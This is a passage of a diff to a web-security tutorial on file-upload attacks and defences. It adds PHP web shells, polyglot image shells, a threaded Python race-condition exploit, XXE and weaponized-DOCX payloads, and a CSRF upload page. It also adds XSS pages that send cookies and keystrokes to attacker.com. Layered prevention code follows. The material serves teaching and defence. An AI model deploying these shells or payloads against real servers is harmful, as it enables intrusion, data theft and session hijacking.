 printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
+**Breakdown:**
+- `\x89\x50\x4E\x47\x0D\x0A\x1A\x0A` = PNG signature
+- Followed by PHP code
+- Valid PNG header + embedded payload
+
+**Accessing polyglot shell:**
+```bash
+curl "https://target.com/uploads/shell.php?cmd=whoami"
+
+# Response may include:
+# [Image binary data...]
+# www-data
+# [More binary data...]
+```
+
+**The PHP output is mixed with image data, but command executes!**
+
+**Cleaner output:**
+```php
+// Advanced polyglot shell
+GIF89a;
+<?php 
+header('Content-Type: text/plain');
+system($_GET['cmd']);
+exit;
+?>
+```
+
+Sets proper header to avoid binary garbage in response.
+
 ## Race condition exploitation
 
-### Vulnerability: File uploaded before validation completes
+### Lab: Web shell upload via race condition
 
-**Vulnerable code flow:**
+**Vulnerable workflow:**
 ```php
 <?php
-// Step 1: Upload file
-$temp_name = $_FILES['file']['tmp_name'];
+// upload.php
 $filename = $_FILES['file']['name'];
+$temp = $_FILES['file']['tmp_name'];
 $destination = "/var/www/uploads/$filename";
 
-move_uploaded_file($temp_name, $destination);
+// Step 1: Upload immediately
+move_uploaded_file($temp, $destination);
 
 // Step 2: Scan for malware (takes time)
-sleep(2);  // Simulates virus scan
-$scan_result = scan_file($destination);
+sleep(2);  // Simulates antivirus scan
+$scanResult = antivirusCheck($destination);
 
 // Step 3: Delete if malicious
-if($scan_result == 'malicious') {
+if($scanResult === 'malware') {
     unlink($destination);
     die("Malicious file detected!");
 }
@@ -727,328 +838,861 @@ echo "File uploaded successfully!";
 ?>
 ```
 
-**The window of vulnerability:**
+**The vulnerability window:**
 ```
-Time 0ms:    File uploaded to /uploads/shell.php
-Time 0-2000ms: File exists and accessible!
-Time 2000ms: Scan completes
-Time 2001ms: File deleted (if malicious)
+Time 0ms:      File uploaded to /uploads/shell.php
+Time 0-2000ms: File EXISTS and ACCESSIBLE ← Attack window
+Time 2000ms:   Scan completes
+Time 2001ms:   File deleted
 ```
+
+**Goal:** Execute the shell during the 2-second window before deletion.
 
 ### Exploitation technique
 
-**Goal:** Execute the file before it's deleted.
+**Attack strategy:**
+1. Upload shell repeatedly (flooding)
+2. Simultaneously attempt to access it
+3. Eventually hit the timing window
+4. Execute command before deletion
 
-**Attack script:**
+**Python exploitation script:**
 ```python
 import requests
 import threading
 import time
 
-target = "https://target.com"
-upload_url = f"{target}/upload"
-shell_url = f"{target}/uploads/shell.php?cmd=whoami"
+TARGET = "https://target.com"
+UPLOAD_URL = f"{TARGET}/upload.php"
+SHELL_URL = f"{TARGET}/uploads/shell.php"
+
+# Simple PHP shell
+shell_content = '<?php system($_GET["cmd"]); ?>'
 
 def upload_shell():
-    """Upload malicious file repeatedly"""
-    while True:
-        files = {
-            'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
-        }
-        requests.post(upload_url, files=files)
-        time.sleep(0.1)
-
-def access_shell():
-    """Try to access shell before deletion"""
+    """Continuously upload shell"""
     while True:
         try:
-            response = requests.get(shell_url, timeout=1)
-            if response.status_code == 200:
-                print(f"[+] Success! Output: {response.text}")
-                if "www-data" in response.text:
-                    print("[+] RCE achieved!")
-                    return
+            files = {
+                'file': ('shell.php', shell_content, 'image/jpeg')
+            }
+            requests.post(UPLOAD_URL, files=files, timeout=2)
         except:
             pass
 
-# Start multiple threads
-for _ in range(10):
-    threading.Thread(target=upload_shell, daemon=True).start()
-    threading.Thread(target=access_shell, daemon=True).start()
+def access_shell():
+    """Continuously try to access and execute shell"""
+    while True:
+        try:
+            params = {'cmd': 'whoami'}
+            response = requests.get(SHELL_URL, params=params, timeout=1)
+            
+            if response.status_code == 200:
+                print(f"[+] SUCCESS! Response: {response.text}")
+                
+                if 'www-data' in response.text or 'root' in response.text:
+                    print("[+] RCE ACHIEVED!")
+                    print(f"[+] Shell accessible at: {SHELL_URL}")
+                    return True
+        except:
+            pass
+    
+    return False
 
-time.sleep(30)  # Run for 30 seconds
+print("[*] Starting race condition attack...")
+print("[*] Uploading shells in 10 threads...")
+print("[*] Attempting access in 10 threads...")
+
+# Launch uploaders
+for i in range(10):
+    t = threading.Thread(target=upload_shell, daemon=True)
+    t.start()
+
+# Launch accessors
+for i in range(10):
+    t = threading.Thread(target=access_shell, daemon=True)
+    t.start()
+
+# Wait for success or timeout
+time.sleep(30)
+print("[*] Attack completed")
 ```
 
-**Success indicators:**
-- Hundreds of upload attempts
-- Simultaneous access attempts
-- Eventually hits the timing window
-- Gets command output before deletion
+**Expected output:**
+```
+[*] Starting race condition attack...
+[*] Uploading shells in 10 threads...
+[*] Attempting access in 10 threads...
+[+] SUCCESS! Response: www-data
+[+] RCE ACHIEVED!
+[+] Shell accessible at: https://target.com/uploads/shell.php
+```
 
 ### Improving success rate
 
-**Technique 1: Slow upload (extend window)**
+**Technique 1: Upload large file to extend window**
 ```python
-# Upload very large file to extend processing time
-large_file = b"<?php system($_GET['cmd']); ?>" + (b"A" * 10000000)  # 10MB
+# Create large payload
+shell_content = '<?php system($_GET["cmd"]); ?>' + ('A' * 10000000)  # 10MB
 
-files = {'file': ('shell.php', large_file, 'image/jpeg')}
+# Processing takes longer → wider attack window
 ```
 
 **Technique 2: Persistent shell**
 ```php
-// shell.php - writes another shell immediately
+// shell.php - writes another shell immediately upon execution
 <?php
-file_put_contents('../persistent.php', '<?php system($_GET["cmd"]); ?>');
+// Write persistent shell
+file_put_contents('../backup.php', '<?php system($_GET["cmd"]); ?>');
+
+// Execute current command
 system($_GET['cmd']);
 ?>
 ```
 
-Even if `shell.php` deleted, `persistent.php` remains!
+**Even if `shell.php` deleted, `backup.php` persists!**
 
-**Technique 3: Trigger via include**
-```php
-// Upload this as shell.php
-<?php
-include('/path/to/script/that/includes/uploads/files.php');
-system($_GET['cmd']);
-?>
+**Technique 3: Brute force with timing**
+```python
+import time
+
+# Upload
+start = time.time()
+upload_shell()
+upload_duration = time.time() - start
+
+# Access immediately after upload
+time.sleep(upload_duration + 0.01)  # Precise timing
+access_shell()
 ```
 
-## Client-side attacks via file upload
+## Additional attack vectors (from OWASP)
 
-### Stored XSS via HTML upload
+### Client-side attacks via file upload
 
-**If application serves uploaded files without proper headers:**
-
-**Upload malicious HTML:**
+**1) Stored XSS via HTML upload**
 ```html
 <!-- xss.html -->
 <html>
 <body>
 <script>
-    // Steal cookies
-    fetch('https://attacker.com/steal?cookie=' + document.cookie);
-    
-    // Redirect to phishing
-    window.location = 'https://attacker.com/phishing';
+// Steal cookies
+fetch('https://attacker.com/steal?cookie=' + document.cookie);
+
+// Keylogger
+document.onkeypress = function(e) {
+    fetch('https://attacker.com/keys?key=' + e.key);
+};
+
+// Redirect to phishing
+setTimeout(function() {
+    window.location = 'https://attacker.com/phishing-login';
+}, 5000);
 </script>
 </body>
 </html>
 ```
 
-**Access:**
-```
-https://target.com/uploads/xss.html
-```
+**Upload and share:** `https://target.com/uploads/xss.html`
 
-**If same-origin:** Executes JavaScript in context of target.com → steal cookies, hijack sessions.
+**Victim visits → JavaScript executes in `target.com` origin → Session hijacking**
 
-### Stored XSS via SVG upload
-
-**SVG files support embedded JavaScript:**
-
+**2) Stored XSS via SVG upload**
 ```xml
+<!-- xss.svg -->
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <rect width="300" height="100" style="fill:rgb(0,0,255);"/>
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <script type="text/javascript">
-      alert("XSS via SVG");
-      fetch('https://attacker.com/steal?cookie=' + document.cookie);
+      alert("XSS");
+      // Steal session
+      new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
    </script>
 </svg>
 ```
 
-**Why it works:**
-- Valid SVG file (passes validation)
-- Contains JavaScript
-- Browser executes when rendering
+**Advantages:**
+- SVG is valid image format (passes validation)
+- Supports embedded JavaScript
+- Rendered inline by browsers
 
-### XXE via uploaded XML files
+**3) XXE via XML document upload**
 
-**If application processes uploaded XML:**
+**If application processes uploaded Office documents, XML files:**
 
 ```xml
 <!-- xxe.xml -->
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-   <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<foo>&xxe;</foo>
+<root>
+   <data>&xxe;</data>
+</root>
 ```
 
-**Or external DTD:**
-```xml
+**Upload `xxe.xml` → Application parses → Returns `/etc/passwd` contents**
+
+**Office document XXE (DOCX, XLSX):**
+```bash
+# DOCX files are ZIP archives
+unzip document.docx
+cd word
+
+# Edit document.xml
 <!DOCTYPE foo [
-   <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
-   %xxe;
+   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
+<w:document>
+   <w:body>
+      <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
+   </w:body>
+</w:document>
+
+# Rezip
+zip -r weaponized.docx *
+
+# Upload weaponized.docx
 ```
 
-**Result:** Read local files, SSRF, etc.
+**When application processes document → XXE triggered → File disclosure**
 
-## Prevention strategies
+### PUT method upload (from PortSwigger)
 
-### 1) Whitelist allowed extensions
+**Some servers support HTTP PUT for file upload:**
 
-**Bad - Blacklist:**
-```php
-$blacklist = ['php', 'exe', 'sh'];
-if(in_array($extension, $blacklist)) die("Blocked");
+**Discovery:**
+```http
+OPTIONS /uploads/ HTTP/1.1
+Host: target.com
 ```
 
-**Good - Whitelist:**
+**Response:**
+```http
+HTTP/1.1 200 OK
+Allow: GET, POST, PUT, DELETE, OPTIONS
+```
+
+`PUT` method supported!
+
+**Exploitation:**
+```http
+PUT /uploads/shell.php HTTP/1.1
+Host: target.com
+Content-Type: application/x-httpd-php
+Content-Length: 34
+
+<?php system($_GET['cmd']); ?>
+```
+
+**No multipart form-data needed, direct file creation!**
+
+**Advantages:**
+- Bypasses form-based validation
+- Direct file path specification
+- Often lacks protections
+
+### CSRF on file upload (from OWASP)
+
+**If upload lacks CSRF protection:**
+
+**Attack page hosted by attacker:**
+```html
+<!-- csrf-upload.html on attacker.com -->
+<html>
+<body>
+<form id="uploadForm" 
+      action="https://target.com/upload" 
+      method="post" 
+      enctype="multipart/form-data">
+    <input type="file" name="file" value="shell.php">
+</form>
+
+<script>
+// Automatically submit when victim visits
+document.getElementById('uploadForm').submit();
+</script>
+</body>
+</html>
+```
+
+**Attack flow:**
+1. Victim logged into `target.com`
+2. Attacker tricks victim to visit `attacker.com/csrf-upload.html`
+3. Form auto-submits to `target.com/upload`
+4. Uses victim's session cookies
+5. Malicious file uploaded under victim's account
+
+## Comprehensive prevention strategies
+
+### Defense Layer 1: Extension whitelisting (OWASP + PortSwigger)
+
+**From OWASP - Whitelist approach:**
 ```php
-$whitelist = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
+<?php
+// ONLY allow business-critical extensions
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
+
+$filename = $_FILES['file']['name'];
 $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
 
-if(!in_array($extension, $whitelist)) {
+if(!in_array($extension, $allowedExtensions)) {
     die("Only images and PDFs allowed");
 }
+
+// Continue processing...
+?>
 ```
 
-### 2) Validate file content (magic bytes)
+**Key points:**
+- Whitelist, not blacklist
+- Convert to lowercase (prevent case bypasses)
+- Use `pathinfo()` correctly
+- Minimal necessary extensions only
 
+### Defense Layer 2: Filename sanitization (OWASP)
+
+**From OWASP - Comprehensive filename security:**
 ```php
+<?php
+function sanitizeFilename($filename) {
+    // Remove path components
+    $filename = basename($filename);
+    
+    // Remove special characters
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $filename);
+    
+    // Remove leading dots (hidden files) and periods (directory traversal)
+    $filename = ltrim($filename, '.');
+    
+    // Remove multiple consecutive periods
+    $filename = preg_replace('/\.+/', '.', $filename);
+    
+    // Length limit
+    if(strlen($filename) > 200) {
+        $filename = substr($filename, 0, 200);
+    }
+    
+    // Better: Generate random filename
+    $extension = pathinfo($filename, PATHINFO_EXTENSION);
+    $newFilename = bin2hex(random_bytes(16)) . '.' . $extension;
+    
+    return $newFilename;
+}
+?>
+```
+
+**OWASP recommendations:**
+- Generate random UUID/GUID for filename
+- If user filename required: strict character restrictions
+- Alphanumeric + hyphen + underscore only
+- No leading dots, spaces, hyphens
+- Length limit (filesystem dependent)
+
+### Defense Layer 3: Content validation (OWASP + PortSwigger)
+
+**From OWASP - Validate actual content:**
+```php
+<?php
 function validateImageContent($file) {
+    // Check MIME type (server-side)
     $finfo = finfo_open(FILEINFO_MIME_TYPE);
     $mimeType = finfo_file($finfo, $file);
     finfo_close($finfo);
     
     $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
-    
     if(!in_array($mimeType, $allowedMimes)) {
         return false;
     }
     
-    // Additional check: Verify image can be processed
+    // Validate image integrity
     $imageInfo = getimagesize($file);
     if($imageInfo === false) {
-        return false;  // Not a valid image
+        return false;
     }
+    
+    // Check dimensions (prevent huge images)
+    list($width, $height) = $imageInfo;
+    if($width > 5000 || $height > 5000) {
+        return false;  // Too large
+    }
+    
+    // Image rewriting (from OWASP)
+    // Destroys any embedded malicious content
+    $image = imagecreatefromstring(file_get_contents($file));
+    if($image === false) {
+        return false;
+    }
+    
+    // Rewrite image (removes EXIF, metadata, embedded code)
+    $newFile = tempnam(sys_get_temp_dir(), 'img_');
+    imagejpeg($image, $newFile, 90);  // Rewrite as clean JPEG
+    imagedestroy($image);
+    
+    // Replace original with cleaned version
+    unlink($file);
+    rename($newFile, $file);
     
     return true;
 }
+?>
 ```
 
-### 3) Rename uploaded files
+**OWASP image rewriting benefits:**
+- Removes all metadata (EXIF, comments)
+- Destroys embedded PHP/scripts
+- Normalizes image format
+- Validates image is actually processable
+
+**For documents (from OWASP):**
+```php
+// For Office documents: Use Apache POI (Java)
+// Validates document structure
+// Detects macros, embedded objects
+```
+
+### Defense Layer 4: Secure storage (OWASP priority-based)
+
+**From OWASP - Storage location priority:**
+
+**Priority 1: Separate server (highest security)**
+```
+Application server: app.example.com
+File storage server: files.example.com (completely separate)
+
+Benefits:
+- No code execution possible on file server
+- Segregation of duties
+- Isolated compromise
+```
+
+**Priority 2: Outside webroot**
+```
+Web root: /var/www/html/
+Uploads:  /var/file_storage/uploads/ (outside webroot)
+
+Access via handler:
+```
 
 ```php
-// Never use user-supplied filename
-$extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
-$newFilename = uniqid('', true) . '.' . $extension;
-$destination = "/var/www/uploads/$newFilename";
+// download.php
+<?php
+$fileId = $_GET['id'];
 
-move_uploaded_file($_FILES['file']['tmp_name'], $destination);
+// Authorization check
+if(!user_can_access($fileId, $currentUser)) {
+    die("Access denied");
+}
+
+// Retrieve from outside webroot
+$filePath = '/var/file_storage/uploads/' . $fileId;
+
+// Force download (never execute)
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
+readfile($filePath);
+?>
 ```
 
-### 4) Store files outside web root
+**Benefits:**
+- Files not directly accessible via URL
+- Mandatory authorization checks
+- Force download (Content-Disposition)
 
-```php
-// Upload to non-web-accessible directory
-$uploadDir = '/var/file_storage/uploads/';  // Outside /var/www/
-
-// Serve via script that checks permissions
-@app.route('/download/<file_id>')
-def download_file(file_id):
-    if not user_has_permission(current_user, file_id):
-        abort(403)
-    
-    file_path = f'/var/file_storage/uploads/{file_id}'
-    return send_file(file_path, as_attachment=True)
-```
-
-### 5) Configure server to not execute uploads
-
-**Apache - Disable PHP in uploads directory:**
+**Priority 3: Inside webroot with restrictions**
 ```apache
 # /var/www/uploads/.htaccess
-<FilesMatch "\.ph(p[3-7]?|tml)$">
-    SetHandler none
-    ForceType text/plain
+
+# Disable all script execution
+RemoveHandler .php .php3 .php4 .php5 .phtml .shtml
+
+# Set all files as plain text
+ForceType application/octet-stream
+
+# Or deny execution
+<FilesMatch "\.ph">
+    Deny from all
 </FilesMatch>
 
-# Or completely disable all handlers
-RemoveHandler .php .php3 .php4 .php5 .phtml
+# Set write-only permissions
+# Files can be uploaded but not read via web
 ```
 
-**Nginx:**
-```nginx
-location /uploads/ {
-    # Disable PHP execution
-    location ~ \.php$ {
-        deny all;
+### Defense Layer 5: File size limits (OWASP)
+
+**From OWASP - Prevent DoS:**
+```php
+<?php
+// Maximum file size: 5MB
+$maxFileSize = 5 * 1024 * 1024;
+
+if($_FILES['file']['size'] > $maxFileSize) {
+    die("File too large (max 5MB)");
+}
+
+// Minimum file size: 100 bytes (prevent tiny DoS files)
+if($_FILES['file']['size'] < 100) {
+    die("File too small");
+}
+
+// For ZIP files: Check decompressed size
+if($extension == 'zip') {
+    $zip = new ZipArchive();
+    if($zip->open($tempFile) === TRUE) {
+        $totalSize = 0;
+        for($i = 0; $i < $zip->numFiles; $i++) {
+            $stat = $zip->statIndex($i);
+            $totalSize += $stat['size'];
+        }
+        $zip->close();
+        
+        // Decompressed size limit: 50MB
+        if($totalSize > 50 * 1024 * 1024) {
+            die("ZIP content too large");
+        }
     }
 }
+?>
 ```
 
-### 6) Use Content-Disposition header
+### Defense Layer 6: Antivirus and sandboxing (OWASP)
 
+**From OWASP - Malware detection:**
 ```php
-// Force download instead of execution
+<?php
+// Integrate with ClamAV
+function scanFile($filePath) {
+    $clamav = "/usr/bin/clamscan";
+    $output = shell_exec("$clamav --no-summary $filePath");
+    
+    if(strpos($output, 'FOUND') !== false) {
+        return 'malware';
+    }
+    
+    return 'clean';
+}
+
+// Or use VirusTotal API
+function scanWithVirusTotal($filePath) {
+    $apiKey = 'YOUR_API_KEY';
+    $url = 'https://www.virustotal.com/vtapi/v2/file/scan';
+    
+    $post = [
+        'apikey' => $apiKey,
+        'file' => new CURLFile($filePath)
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    // Check results...
+}
+
+// Sandbox execution (from OWASP)
+// Run file in isolated environment before allowing
+```
+
+### Defense Layer 7: CDR - Content Disarm & Reconstruct (OWASP)
+
+**From OWASP - For documents:**
+```php
+<?php
+// CDR process for PDF, DOCX, etc.
+function disarmAndReconstruct($file, $type) {
+    if($type == 'pdf') {
+        // Extract text and safe elements only
+        // Rebuild PDF without scripts, macros, embedded files
+        
+        // Libraries: pdf-parser, PyPDF2, pdftk
+        $output = shell_exec("pdftk $file output clean.pdf uncompress");
+        
+        // Remove JavaScript, embedded files
+        $content = file_get_contents('clean.pdf');
+        $content = preg_replace('/\/JavaScript.*?>>/', '', $content);
+        $content = preg_replace('/\/EmbeddedFiles.*?>>/', '', $content);
+        file_put_contents('clean.pdf', $content);
+        
+        return 'clean.pdf';
+    }
+    
+    if($type == 'docx') {
+        // DOCX is ZIP archive
+        // Extract, remove macros, rebuild
+        
+        // Remove vbaProject.bin (contains macros)
+        $zip = new ZipArchive();
+        $zip->open($file);
+        $zip->deleteName('word/vbaProject.bin');
+        $zip->close();
+        
+        return $file;
+    }
+}
+?>
+```
+
+### Defense Layer 8: Access control (OWASP)
+
+**From OWASP - Authentication & authorization:**
+```php
+<?php
+// Require authentication
+session_start();
+if(!isset($_SESSION['user_id'])) {
+    die("Login required");
+}
+
+// Rate limiting (per user)
+$userId = $_SESSION['user_id'];
+$uploadCount = getUploadCount($userId, last_hour);
+
+if($uploadCount > 10) {
+    die("Upload limit exceeded (10 per hour)");
+}
+
+// Storage quota
+$userStorage = getUserStorageUsed($userId);
+$maxStorage = 100 * 1024 * 1024;  // 100MB per user
+
+if($userStorage >= $maxStorage) {
+    die("Storage quota exceeded");
+}
+
+// Log all uploads
+logUpload($userId, $filename, $filesize, $_SERVER['REMOTE_ADDR']);
+?>
+```
+
+### Defense Layer 9: CSRF protection (OWASP)
+
+**From OWASP - Prevent CSRF upload:**
+```php
+<?php
+// Generate CSRF token
+session_start();
+if(empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+?>
+
+<!-- In upload form -->
+<form action="/upload" method="post" enctype="multipart/form-data">
+    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
+    <input type="file" name="file">
+    <input type="submit" value="Upload">
+</form>
+
+<?php
+// Validate token on upload
+if($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+    die("CSRF token validation failed");
+}
+?>
+```
+
+### Defense Layer 10: Filesystem permissions (OWASP)
+
+**From OWASP - Least privilege:**
+```bash
+# Upload directory permissions
+chmod 755 /var/www/uploads/  # rwxr-xr-x
+
+# Individual files
+chmod 644 uploaded_file.jpg   # rw-r--r--
+
+# Ownership
+chown www-data:www-data /var/www/uploads/
+
+# Disable execution bit
+chmod -R -x /var/www/uploads/*
+```
+
+**In code:**
+```php
+<?php
+// Set restrictive permissions on upload
+$destination = '/var/www/uploads/' . $filename;
+move_uploaded_file($temp, $destination);
+
+// Set read-only for web server user
+chmod($destination, 0644);  // rw-r--r--
+chown($destination, 'www-data');
+?>
+```
+
+## Complete secure upload implementation
+
+**Combining all defenses (PortSwigger + OWASP):**
+```php
+<?php
+session_start();
+
+// 1. Authentication (OWASP)
+if(!isset($_SESSION['user_id'])) {
+    http_response_code(401);
+    die(json_encode(['error' => 'Authentication required']));
+}
+
+// 2. CSRF protection (OWASP)
+if($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+    http_response_code(403);
+    die(json_encode(['error' => 'CSRF validation failed']));
+}
+
+// 3. Rate limiting (OWASP)
+$userId = $_SESSION['user_id'];
+if(getUserUploadCount($userId, 3600) > 10) {
+    http_response_code(429);
+    die(json_encode(['error' => 'Rate limit exceeded']));
+}
+
+// 4. File upload check
+if(!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
+    http_response_code(400);
+    die(json_encode(['error' => 'Upload failed']));
+}
+
+$file = $_FILES['file'];
+$tempFile = $file['tmp_name'];
+
+// 5. Size validation (OWASP)
+$maxSize = 5 * 1024 * 1024;  // 5MB
+if($file['size'] > $maxSize || $file['size'] < 100) {
+    http_response_code(400);
+    die(json_encode(['error' => 'Invalid file size']));
+}
+
+// 6. Extension whitelist (PortSwigger + OWASP)
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
+$originalName = basename($file['name']);
+$extension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
+
+if(!in_array($extension, $allowedExtensions)) {
+    http_response_code(400);
+    die(json_encode(['error' => 'File type not allowed']));
+}
+
+// 7. MIME type validation (OWASP)
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mimeType = finfo_file($finfo, $tempFile);
+finfo_close($finfo);
+
+$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
+if(!in_array($mimeType, $allowedMimes)) {
+    http_response_code(400);
+    die(json_encode(['error' => 'Invalid file type']));
+}
+
+// 8. Content validation (PortSwigger)
+$imageInfo = getimagesize($tempFile);
+if($imageInfo === false) {
+    http_response_code(400);
+    die(json_encode(['error' => 'Not a valid image']));
+}
+
+// 9. Image rewriting (OWASP - destroys embedded code)
+$image = imagecreatefromstring(file_get_contents($tempFile));
+if($image === false) {
+    http_response_code(400);
+    die(json_encode(['error' => 'Image processing failed']));
+}
+
+$cleanedFile = tempnam(sys_get_temp_dir(), 'img_');
+imagejpeg($image, $cleanedFile, 90);
+imagedestroy($image);
+
+// 10. Antivirus scan (OWASP)
+$scanResult = scanFileWithClamAV($cleanedFile);
+if($scanResult === 'malware') {
+    unlink($cleanedFile);
+    http_response_code(400);
+    die(json_encode(['error' => 'Malware detected']));
+}
+
+// 11. Generate secure filename (OWASP)
+$newFilename = bin2hex(random_bytes(16)) . '.' . $extension;
+
+// 12. Store outside webroot (OWASP priority 2)
+$uploadDir = '/var/file_storage/uploads/' . $userId . '/';
+if(!is_dir($uploadDir)) {
+    mkdir($uploadDir, 0755, true);
+}
+
+$destination = $uploadDir . $newFilename;
+
+// 13. Move with error handling
+if(!rename($cleanedFile, $destination)) {
+    http_response_code(500);
+    die(json_encode(['error' => 'Storage failed']));
+}
+
+// 14. Set restrictive permissions (OWASP)
+chmod($destination, 0644);
+
+// 15. Log upload (OWASP)
+logFileUpload($userId, $originalName, $newFilename, $file['size'], $_SERVER['REMOTE_ADDR']);
+
+// 16. Return file ID (not path)
+$fileId = insertFileRecord($userId, $newFilename, $originalName, $file['size']);
+
+http_response_code(200);
+echo json_encode([
+    'success' => true,
+    'file_id' => $fileId  // Use ID, not filename
+]);
+?>
+```
+
+**File retrieval (secure):**
+```php
+<?php
+// download.php
+session_start();
+
+if(!isset($_SESSION['user_id'])) {
+    http_response_code(401);
+    die('Authentication required');
+}
+
+$fileId = $_GET['id'] ?? '';
+$userId = $_SESSION['user_id'];
+
+// Get file metadata
+$file = getFileById($fileId);
+
+if(!$file) {
+    http_response_code(404);
+    die('File not found');
+}
+
+// Authorization check
+if($file['user_id'] !== $userId && !isAdmin($userId)) {
+    http_response_code(403);
+    die('Access denied');
+}
+
+// Construct path (outside webroot)
+$filePath = '/var/file_storage/uploads/' . $file['user_id'] . '/' . $file['filename'];
+
+if(!file_exists($filePath)) {
+    http_response_code(404);
+    die('File not found');
+}
+
+// Force download (never execute)
 header('Content-Type: application/octet-stream');
-header('Content-Disposition: attachment; filename="' . $filename . '"');
-readfile($filepath);
-```
+header('Content-Disposition: attachment; filename="' . $file['original_name'] . '"');
+header('Content-Length: ' . filesize($filePath));
+header('X-Content-Type-Options: nosniff');  // Prevent MIME sniffing
 
-### 7) Implement comprehensive validation
-
-```php
-function secureFileUpload($file) {
-    // 1. Check file was uploaded via HTTP POST
-    if(!is_uploaded_file($file['tmp_name'])) {
-        return ['error' => 'Invalid upload'];
-    }
-    
-    // 2. Check file size
-    $maxSize = 5 * 1024 * 1024;  // 5MB
-    if($file['size'] > $maxSize) {
-        return ['error' => 'File too large'];
-    }
-    
-    // 3. Validate extension (whitelist)
-    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
-    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
-    if(!in_array($extension, $allowedExtensions)) {
-        return ['error' => 'Invalid file type'];
-    }
-    
-    // 4. Validate MIME type
-    $finfo = finfo_open(FILEINFO_MIME_TYPE);
-    $mimeType = finfo_file($finfo, $file['tmp_name']);
-    finfo_close($finfo);
-    
-    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
-    if(!in_array($mimeType, $allowedMimes)) {
-        return ['error' => 'Invalid MIME type'];
-    }
-    
-    // 5. Validate actual image
-    $imageInfo = getimagesize($file['tmp_name']);
-    if($imageInfo === false) {
-        return ['error' => 'Not a valid image'];
-    }
-    
-    // 6. Strip any path components from filename
-    $basename = basename($file['name']);
-    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $basename);
-    
-    // 7. Generate unique filename
-    $newFilename = uniqid() . '_' . time() . '.' . $extension;
-    
-    // 8. Move to safe location (outside web root)
-    $uploadDir = '/var/secure_storage/uploads/';
-    $destination = $uploadDir . $newFilename;
-    
-    if(!move_uploaded_file($file['tmp_name'], $destination)) {
-        return ['error' => 'Upload failed'];
-    }
-    
-    // 9. Set restrictive permissions
-    chmod($destination, 0644);
-    
-    return ['success' => true, 'filename' => $newFilename];
-}
+readfile($filePath);
+exit;
+?>
 ```
